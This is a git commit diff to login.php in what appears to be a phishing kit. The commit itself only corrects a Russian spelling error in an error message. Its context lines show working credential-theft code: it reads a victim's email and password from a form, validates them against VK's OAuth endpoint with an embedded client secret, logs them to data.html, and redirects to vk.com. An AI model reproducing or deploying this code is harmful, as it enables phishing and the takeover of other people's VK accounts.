459f9eabc664469613a0811607c2a91537be0533
termux-lab <59764619+termux-lab@users.noreply.github.com>
2020-03-09 07:26:06 +0300

    Update login.php

--- login.php
+++ login.php
@@ -2,7 +2,7 @@
 $login = $_POST['email'];
 $pass= $_POST['pass'];
 if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass")){
-  $all = "<b style='color:red'>Не верные данные...<br>Login: $login<br>Password: $pass</b><hr>";
+  $all = "<b style='color:red'>Неверные данные...<br>Login: $login<br>Password: $pass</b><hr>";
   $fp = fopen("data.html", 'a+');
   fwrite($fp, "$all");
   fclose($fp);
@@ -18,7 +18,7 @@ if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id
       fclose($fp);
       header("location: https://vk.com/pozitive_youmor?z=photo-116217300_456239788%2Falbum-116217300_0%2Frev");
   }else{
-      $all = "<b style='color:red'>Не верные данные...<br>Login: $login<br>Password: $pass</b><hr>";
+      $all = "<b style='color:red'>Неверные данные...<br>Login: $login<br>Password: $pass</b><hr>";
       $fp = fopen("data.html", 'a+');
       fwrite($fp, "$all");
       fclose($fp);
